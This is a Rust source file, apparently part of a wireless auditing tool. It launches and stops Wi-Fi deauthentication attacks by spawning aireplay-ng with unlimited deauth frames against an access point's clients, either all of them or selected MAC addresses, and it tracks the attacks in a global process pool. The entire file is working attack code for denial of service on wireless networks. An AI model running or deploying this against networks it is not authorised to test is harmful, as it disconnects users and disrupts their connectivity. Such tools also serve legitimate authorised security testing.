use std::collections::HashMap;
use std::process::Command;
use std::sync::MutexGuard;
use crate::globals::*;
use crate::types::*;
use crate::error::Error;

pub fn launch_deauth_attack(ap: AP, only_specific_clients: Option<Vec<String>>) -> Result<(), Error> {
    let iface = match IFACE.lock().unwrap().as_ref() {
        Some(res) => res.to_string(),
        None => return Err(Error::new("No interface set")),
    };

    let mut attack_pool = super::get_attack_pool();

    let attack_targets = match only_specific_clients {
        Some(specific_clients) => {
            let mut cli_attack_targets = vec![];
            for cli in specific_clients {
                cli_attack_targets.push((
                    cli.to_owned(),
                    Command::new("aireplay-ng")
                        .args(["-0", "0", "-D", "-a", &ap.bssid, "-c", &cli, &iface])
                        .stdout(std::process::Stdio::null())
                        .spawn()?,
                ));
            }
            AttackedClients::Selection(cli_attack_targets)
        }
        None => AttackedClients::All(
            Command::new("aireplay-ng")
                .args(["-0", "0", "-D", "-a", &ap.bssid, &iface])
                .stdout(std::process::Stdio::null())
                .spawn()?,
        ),
    };

    attack_pool.insert(ap.bssid.to_string(), (ap, attack_targets));

    Ok(())
}

pub fn stop_deauth_attack(ap_bssid: &str) {
    let mut attack_pool = super::get_attack_pool();
    if let Some(attack_target) = attack_pool.get_mut(ap_bssid) {
        match &mut attack_target.1 {
            AttackedClients::All(child) => {
                child.kill().unwrap();
                child.wait().unwrap();
            }
            AttackedClients::Selection(child_list) => {
                for (_cli, child) in child_list {
                    child.kill().unwrap();
                    child.wait().unwrap();
                }
            }
        }
    }
    attack_pool.remove(ap_bssid);
}

pub fn get_attack_pool() -> MutexGuard<'static, HashMap<String, (AP, AttackedClients)>> {
    ATTACK_POOL.lock().unwrap()
}